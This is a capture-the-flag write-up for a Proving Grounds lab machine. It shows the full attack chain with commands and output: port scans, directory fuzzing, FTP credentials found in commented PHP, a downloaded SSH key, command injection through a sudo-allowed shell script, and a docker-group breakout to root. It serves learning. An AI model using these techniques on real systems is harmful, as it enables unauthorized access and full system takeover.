## Proving Grounds Play
Target : 192.168.231.95

## Recon
```
└─# rustscan --ulimit=5000 --range=1-65535 -a 192.168.231.95 -- -sV
Open 192.168.231.95:22
Open 192.168.231.95:21
Open 192.168.231.95:80
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 61 vsftpd 3.0.3
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

└─# nmap -sC -A -Pn -p21,80 192.168.231.95
Nmap scan report for 192.168.231.95
Host is up (0.22s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-title: Pwned....!!
|_http-server-header: Apache/2.4.38 (Debian)

```
```
A last note from Attacker :)
I am Annlynn. I am the hacker hacked your server with your employees but they don't know how i used them. 
Now they worry about this. Before finding me investigate your employees first. (LOL) then find meBoomers XD..!!
```
`user: Annlynn`

found this on comment : `I forgot to add this on last note
     You are pretty smart as i thought 
     so here i left it for you 
     She sings very well. l loved it`

 ## Fuzz directory
```

 :: Method           : GET
 :: URL              : http://192.168.231.95/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 3065, Words: 1523, Lines: 76, Duration: 181ms]
.htaccess               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 261ms]
.hta                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 370ms]
.htpasswd               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 374ms]
index.html              [Status: 200, Size: 3065, Words: 1523, Lines: 76, Duration: 248ms]
robots.txt              [Status: 200, Size: 61, Words: 6, Lines: 6, Duration: 271ms]
server-status           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 415ms]

# Group 1

User-agent: *
Allow: /nothing
Allow: /hidden_text
```
In the hidden_text i found a secret.dic
```
└─# wc -l secret.dic 
22 secret.dic
└─# cat secret.dic 
/hacked
/vanakam_nanba
/hackerman.gif 
/facebook
/whatsapp
/instagram
/pwned
/pwned.com
/pubg 
/cod
/fortnite
/youtube
/kali.org
/hacked.vuln
/users.vuln
/passwd.vuln
/pwned.vuln
/backup.vuln
/.ssh
/root
/home
```
I will fuzz also on the website
```
└─# ffuf -u "http://192.168.231.95/FUZZ" -w secret.dic 
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 3065, Words: 1523, Lines: 76, Duration: 588ms]
/pwned.vuln             [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 500ms]


```
found a login page, in source code
```
<?php
//	if (isset($_POST['submit'])) {
//		$un=$_POST['username'];
//		$pw=$_POST['password'];
//
//	if ($un=='ftpuser' && $pw=='B0ss_Pr!ncesS') {
//		echo "welcome"
//		exit();
// }
// else 
//	echo "Invalid creds"
// }
?>

```
I will try on ftp
```
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||47979|)
150 Here comes the directory listing.
drwxrwxrwx    3 0        0            4096 Jul 09  2020 .
drwxr-xr-x    5 0        0            4096 Jul 10  2020 ..
drwxr-xr-x    2 0        0            4096 Jul 10  2020 share
226 Directory send OK.
ftp> 
ftp> cd share
250 Directory successfully changed.
ftp> ls -la
229 Entering Extended Passive Mode (|||7421|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jul 10  2020 .
drwxrwxrwx    3 0        0            4096 Jul 09  2020 ..
-rw-r--r--    1 0        0            2602 Jul 09  2020 id_rsa
-rw-r--r--    1 0        0              75 Jul 09  2020 note.txt
226 Directory send OK.
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||19044|)
150 Opening BINARY mode data connection for id_rsa (2602 bytes).
100% |****************************************************************************************|  2602      221.59 KiB/s    00:00 ETA
226 Transfer complete.
2602 bytes received in 00:00 (14.28 KiB/s)
ftp> get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||48125|)
150 Opening BINARY mode data connection for note.txt (75 bytes).
100% |****************************************************************************************|    75      272.27 KiB/s    00:00 ETA
226 Transfer complete.
```
```
└─# cat note.txt 
Wow you are here 
ariana won't happy about this note 
sorry ariana :( 



```
`user2 = ariana`
Logged in
```
ariana@pwned:~$ ls
ariana-personal.diary  local.txt  user1.txt
ariana@pwned:~$ cat local.txt
84b735bf3d6e7147c0dbf9e758f885d5
ariana@pwned:~$ 

```
## Lateral Escalation
```
ariana@pwned:~$ cat ariana-personal.diary 
Its Ariana personal Diary :::
Today Selena fight with me for Ajay. so i opened her hidden_text on server. now she resposible for the issue.
ariana@pwned:~$ 

```
`user3= selena`
```
ariana@pwned:/home$ ls
ariana  ftpuser  messenger.sh  selena
ariana@pwned:/home$ sudo -l
Matching Defaults entries for ariana on pwned:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ariana may run the following commands on pwned:
    (selena) NOPASSWD: /home/messenger.sh
ariana@pwned:/home$ 
```
Now i need to escalate on selena user
```
ariana@pwned:/home$ cat messenger.sh
#!/bin/bash

clear
echo "Welcome to linux.messenger "
		echo ""
users=$(cat /etc/passwd | grep home |  cut -d/ -f 3)
		echo ""
echo "$users"
		echo ""
read -p "Enter username to send message : " name 
		echo ""
read -p "Enter message for $name :" msg
		echo ""
echo "Sending message to $name "

$msg 2> /dev/null

		echo ""
echo "Message sent to $name :) "
		echo ""
ariana@pwned:/home$ 
```
Escalate 
```
sudo -u selena /home/messenger.sh
Welcome to linux.messenger 


ariana:
selena:
ftpuser:

Enter username to send message : id

Enter message for id :id

Sending message to id 
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)

Message sent to id :) 
```
I can execute command here.
```

Sending message to /bin/bash 
id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
python3 -c 'import pty; pty.spawn("/bin/bash")'
selena@pwned:/home$ whoami
selena
selena@pwned:/home$ 
selena@pwned:/home$ id
uid=1001(selena) gid=1001(selena) groups=1001(selena),115(docker)
```
Here we have `docker` groups

## Root escalation
```
selena@pwned:~$ docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
selena@pwned:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
privesc             latest              09ae39f0f8fc        3 years ago         88.3MB
<none>              <none>              e13ad046d435        3 years ago         88.3MB
alpine              latest              a24bb4013296        3 years ago         5.57MB
debian              wheezy              10fcec6d95c4        4 years ago         88.3MB
selena@pwned:~$ 
selena@pwned:~$ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
# id
uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
# 
# cat root.txt
Your flag is in another file...
# cat proof.txt	
35e3c14cba4de5a89a409d4f0841a796
# 


```
